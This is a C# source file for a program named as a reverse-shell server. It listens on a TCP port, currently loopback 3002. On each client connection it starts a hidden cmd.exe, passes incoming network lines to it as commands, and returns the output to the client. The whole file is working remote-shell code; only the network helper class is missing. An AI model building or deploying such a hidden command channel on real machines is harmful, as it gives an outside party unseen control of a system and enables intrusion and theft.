using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;

namespace DotNetCsharpReverseShellServer
{
    static class Program
    {
        private static Process _process;
        private static INetService _netService;
        private static int _clientId = -1;

        private static byte[] BufferOut { get; set; } = new byte[1024];
        private static byte[] BufferErr { get; set; } = new byte[1024];

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            // Application.EnableVisualStyles();
            // Application.SetCompatibleTextRenderingDefault(false);
            // Application.Run(new Form1());


            _netService = new TcpSyncNetService();
            ((TcpSyncNetService) _netService).ClientAccepted +=
                new TcpSyncNetService.ClientAcceptedHandler(OnClientAccepted);

            ((TcpSyncNetService) _netService).OutputDataReceived +=
                new TcpSyncNetService.LineReceivedHandler(OnInputAvailable);

            ((TcpSyncNetService) _netService).ClientDisconnected += OnClientDisconnected;

            _netService.Start(IPAddress.Loopback, 3002);
            _netService.AcceptOnClient();
        }

        private static void OnClientAccepted(object sender, int clientId)
        {
            _clientId = clientId;
            _process = new Process();
            _process.StartInfo.FileName = "cmd";
            _process.StartInfo.Arguments = "";
            _process.StartInfo.CreateNoWindow = true;
            _process.StartInfo.UseShellExecute = false;
            _process.StartInfo.RedirectStandardOutput = true;
            _process.StartInfo.RedirectStandardInput = true;
            _process.StartInfo.RedirectStandardError = true;

            _process.Start();

            _process.StandardOutput.BaseStream.BeginRead(BufferOut, 0, BufferOut.Length, OnOutputAvailable,
                _process.StandardOutput);
            _process.StandardError.BaseStream.BeginRead(BufferErr, 0, BufferErr.Length, OnErrorAvailable,
                _process.StandardError);

            _netService.ReadSync(clientId);
        }


        private static void OnClientDisconnected(object sender, int clientId)
        {
            _netService.Shutdown();
            _process.Close();
        }

        private static void OnInputAvailable(object sender, TcpSyncNetService.OutputDataReceivedArgs args)
        {
            _process.StandardInput.WriteLine(args.Line);
            _process.StandardInput.Flush();
        }

        private static void OnOutputAvailable(IAsyncResult ar)
        {
            lock (ar.AsyncState)
            {
                StreamReader processStream = ar.AsyncState as StreamReader;
                int numberOfBytesRead = processStream.BaseStream.EndRead(ar);

                if (numberOfBytesRead == 0)
                {
                    return;
                }

                string output = Encoding.UTF8.GetString(BufferOut, 0, numberOfBytesRead);
                Console.Write(output);
                Console.Out.Flush();

                processStream.BaseStream.BeginRead(BufferOut, 0, BufferOut.Length, OnOutputAvailable, processStream);

                _netService.Write(_clientId, output);
            }
        }

        private static void OnErrorAvailable(IAsyncResult ar)
        {
            lock (ar.AsyncState)
            {
                StreamReader processStream = ar.AsyncState as StreamReader;
                int numberOfBytesRead = processStream.BaseStream.EndRead(ar);


                if (numberOfBytesRead == 0)
                {
                    return;
                }

                string output = Encoding.UTF8.GetString(BufferErr, 0, numberOfBytesRead);
                Console.Write(output);
                Console.Out.Flush();

                processStream.BaseStream.BeginRead(BufferErr, 0, BufferErr.Length, OnErrorAvailable, processStream);

                _netService.Write(_clientId, output);
            }
        }
    }
}